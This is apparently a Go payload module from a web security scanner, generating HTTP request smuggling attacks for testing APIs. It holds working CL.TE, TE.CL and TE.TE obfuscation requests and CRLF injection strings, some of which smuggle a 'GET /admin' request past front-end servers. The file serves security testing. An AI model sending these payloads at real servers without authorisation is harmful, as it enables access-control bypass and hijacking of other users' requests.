package payloads

import (
	"strings"

	"github.com/su1ph3r/indago/pkg/types"
)

// SmugglingGenerator generates HTTP Request Smuggling attack payloads
type SmugglingGenerator struct{}

// NewSmugglingGenerator creates a new HTTP Request Smuggling payload generator
func NewSmugglingGenerator() *SmugglingGenerator {
	return &SmugglingGenerator{}
}

// Type returns the attack type
func (g *SmugglingGenerator) Type() string {
	return types.AttackSmuggling
}

// Generate generates HTTP Request Smuggling payloads for a parameter.
// Uses a sentinel pattern: only generates payloads for the first parameter of
// each endpoint to avoid duplicate infrastructure-level payloads per parameter.
func (g *SmugglingGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	if !g.isSentinelParam(endpoint, param) {
		return nil
	}

	var payloads []Payload

	// CL.TE smuggling payloads
	payloads = append(payloads, g.clTEPayloads()...)

	// TE.CL smuggling payloads
	payloads = append(payloads, g.teCLPayloads()...)

	// TE.TE obfuscation payloads
	payloads = append(payloads, g.teTEObfuscationPayloads()...)

	// CRLF header injection for request splitting
	payloads = append(payloads, g.headerInjectionPayloads()...)

	return payloads
}

// isSentinelParam checks whether this parameter is the sentinel (first) parameter
// for the endpoint, ensuring we only generate smuggling payloads once per endpoint.
func (g *SmugglingGenerator) isSentinelParam(endpoint types.Endpoint, param *types.Parameter) bool {
	if len(endpoint.Parameters) == 0 {
		return false
	}

	// If param matches the first parameter, it is the sentinel
	if param.Name == endpoint.Parameters[0].Name {
		return true
	}

	// If param is a body field and there are no query/path/header params,
	// treat the first body param as sentinel
	if strings.EqualFold(param.In, "body") {
		for _, p := range endpoint.Parameters {
			if !strings.EqualFold(p.In, "body") {
				// There are non-body params, so sentinel is the first overall param
				return false
			}
		}
		// All params are body params; sentinel is the first one
		return param.Name == endpoint.Parameters[0].Name
	}

	return false
}

// clTEPayloads generates Content-Length vs Transfer-Encoding (CL.TE) smuggling payloads.
// These exploit front-end servers that use Content-Length and back-end servers that
// use Transfer-Encoding.
func (g *SmugglingGenerator) clTEPayloads() []Payload {
	return []Payload{
		{
			Value:       "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
			Type:        types.AttackSmuggling,
			Category:    "smuggling",
			Description: "CL.TE: Content-Length takes priority on front-end, Transfer-Encoding on back-end; smuggles prefix 'G' as start of next request",
			Metadata: map[string]string{
				"requires_raw_tcp": "true",
				"inject_header":    "Content-Length: 6\r\nTransfer-Encoding: chunked",
				"technique":        "CL.TE",
			},
		},
		{
			Value:       "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
			Type:        types.AttackSmuggling,
			Category:    "smuggling",
			Description: "CL.TE: Smuggle 'SMUGGLED' keyword past front-end via Content-Length/Transfer-Encoding disagreement",
			Metadata: map[string]string{
				"requires_raw_tcp": "true",
				"inject_header":    "Content-Length: 13\r\nTransfer-Encoding: chunked",
				"technique":        "CL.TE",
			},
		},
		{
			Value:       "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 30\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target",
			Type:        types.AttackSmuggling,
			Category:    "smuggling",
			Description: "CL.TE: Smuggle a GET /admin request to access restricted endpoints via request splitting",
			Metadata: map[string]string{
				"requires_raw_tcp": "true",
				"inject_header":    "Content-Length: 30\r\nTransfer-Encoding: chunked",
				"technique":        "CL.TE",
			},
		},
	}
}

// teCLPayloads generates Transfer-Encoding vs Content-Length (TE.CL) smuggling payloads.
// These exploit front-end servers that use Transfer-Encoding and back-end servers that
// use Content-Length.
func (g *SmugglingGenerator) teCLPayloads() []Payload {
	return []Payload{
		{
			Value:       "POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n1\r\nG\r\n0\r\n\r\n",
			Type:        types.AttackSmuggling,
			Category:    "smuggling",
			Description: "TE.CL: Transfer-Encoding takes priority on front-end, Content-Length on back-end; smuggles trailing data",
			Metadata: map[string]string{
				"requires_raw_tcp": "true",
				"inject_header":    "Transfer-Encoding: chunked\r\nContent-Length: 3",
				"technique":        "TE.CL",
			},
		},
		{
			Value:       "POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n2e\r\nGET /admin HTTP/1.1\r\nHost: target\r\nX-Ignore: x\r\n0\r\n\r\n",
			Type:        types.AttackSmuggling,
			Category:    "smuggling",
			Description: "TE.CL: Smuggle a GET /admin request via reversed Transfer-Encoding/Content-Length priority",
			Metadata: map[string]string{
				"requires_raw_tcp": "true",
				"inject_header":    "Transfer-Encoding: chunked\r\nContent-Length: 4",
				"technique":        "TE.CL",
			},
		},
		{
			Value:       "POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nSMUGGLED",
			Type:        types.AttackSmuggling,
			Category:    "smuggling",
			Description: "TE.CL: Front-end sees chunked terminator, back-end reads past it using Content-Length",
			Metadata: map[string]string{
				"requires_raw_tcp": "true",
				"inject_header":    "Transfer-Encoding: chunked\r\nContent-Length: 6",
				"technique":        "TE.CL",
			},
		},
	}
}

// teTEObfuscationPayloads generates Transfer-Encoding obfuscation payloads.
// These exploit differences in how front-end and back-end servers parse
// malformed or obfuscated Transfer-Encoding headers.
func (g *SmugglingGenerator) teTEObfuscationPayloads() []Payload {
	return []Payload{
		{
			Value:       "POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: xchunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG",
			Type:        types.AttackSmuggling,
			Category:    "smuggling",
			Description: "TE.TE obfuscation: Invalid 'xchunked' value may be ignored by one server but processed by another",
			Metadata: map[string]string{
				"requires_raw_tcp": "true",
				"inject_header":    "Transfer-Encoding: xchunked",
				"technique":        "TE.TE",
			},
		},
		{
			Value:       "POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding : chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG",
			Type:        types.AttackSmuggling,
			Category:    "smuggling",
			Description: "TE.TE obfuscation: Space before colon in header name may cause parsing disagreement",
			Metadata: map[string]string{
				"requires_raw_tcp": "true",
				"inject_header":    "Transfer-Encoding : chunked",
				"technique":        "TE.TE",
			},
		},
		{
			Value:       "POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG",
			Type:        types.AttackSmuggling,
			Category:    "smuggling",
			Description: "TE.TE obfuscation: Duplicate Transfer-Encoding headers with conflicting values",
			Metadata: map[string]string{
				"requires_raw_tcp": "true",
				"inject_header":    "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
				"technique":        "TE.TE",
			},
		},
		{
			Value:       "POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding:\tchunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG",
			Type:        types.AttackSmuggling,
			Category:    "smuggling",
			Description: "TE.TE obfuscation: Tab character instead of space after colon may cause parsing disagreement",
			Metadata: map[string]string{
				"requires_raw_tcp": "true",
				"inject_header":    "Transfer-Encoding:\tchunked",
				"technique":        "TE.TE",
			},
		},
	}
}

// headerInjectionPayloads generates CRLF injection payloads for request splitting.
// These exploit insufficient input validation to inject headers or entire requests
// via parameter values.
func (g *SmugglingGenerator) headerInjectionPayloads() []Payload {
	return []Payload{
		{
			Value:       "value\r\nX-Injected: true",
			Type:        types.AttackSmuggling,
			Category:    "smuggling",
			Description: "CRLF header injection: Inject arbitrary header via parameter value to test for request splitting",
			Metadata: map[string]string{
				"technique": "crlf_injection",
			},
		},
		{
			Value:       "value\r\n\r\nGET /admin HTTP/1.1\r\nHost: target",
			Type:        types.AttackSmuggling,
			Category:    "smuggling",
			Description: "CRLF request splitting: Inject an entire second request via double CRLF in parameter value",
			Metadata: map[string]string{
				"requires_raw_tcp": "true",
				"technique":        "crlf_injection",
			},
		},
		{
			Value:       "value%0d%0aX-Injected:%20true",
			Type:        types.AttackSmuggling,
			Category:    "smuggling",
			Description: "CRLF header injection (URL-encoded): Inject header via percent-encoded CRLF sequence",
			Metadata: map[string]string{
				"technique": "crlf_injection",
			},
		},
		{
			Value:       "value%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20target",
			Type:        types.AttackSmuggling,
			Category:    "smuggling",
			Description: "CRLF request splitting (URL-encoded): Inject second request via percent-encoded CRLF",
			Metadata: map[string]string{
				"requires_raw_tcp": "true",
				"technique":        "crlf_injection",
			},
		},
	}
}
